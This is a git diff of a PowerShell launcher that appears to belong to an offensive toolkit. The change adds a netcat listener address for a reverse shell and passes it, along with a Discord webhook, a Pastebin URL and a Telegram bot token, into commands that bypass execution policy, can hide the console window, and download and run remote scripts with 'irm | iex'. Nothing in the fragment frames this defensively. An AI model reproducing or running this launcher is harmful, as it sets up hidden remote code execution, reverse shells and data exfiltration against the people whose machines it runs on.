@@ -13,6 +13,7 @@ USAGE
 $hookurl = "DISCORD_WEBHOOK_HERE"
 $ghurl = "PASTEBIN_URL_HERE"
 $tg = "TELEGRAM_BOT_TOKEN"
+$NCurl = "YOUR_NETCAT_IP_ADDRESS" # no port
 
 $Host.UI.RawUI.BackgroundColor = "Black"
 Clear-Host
@@ -107,11 +108,11 @@ $Option = Read-Host "$list"
     $HideURL = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Hide-Powershell-Console.ps1"
     $hidden = Read-Host "Would you like to run this in a hidden window? (Y/N)"
         If ($hidden -eq 'y'){
-            Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -C irm $HideURL | iex ; `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; irm $url | iex")
+            Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -C irm $HideURL | iex ; `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
             break
         }
         If ($hidden -eq 'n'){
-            Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; irm $url | iex")
+            Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
             break
         }
         else{
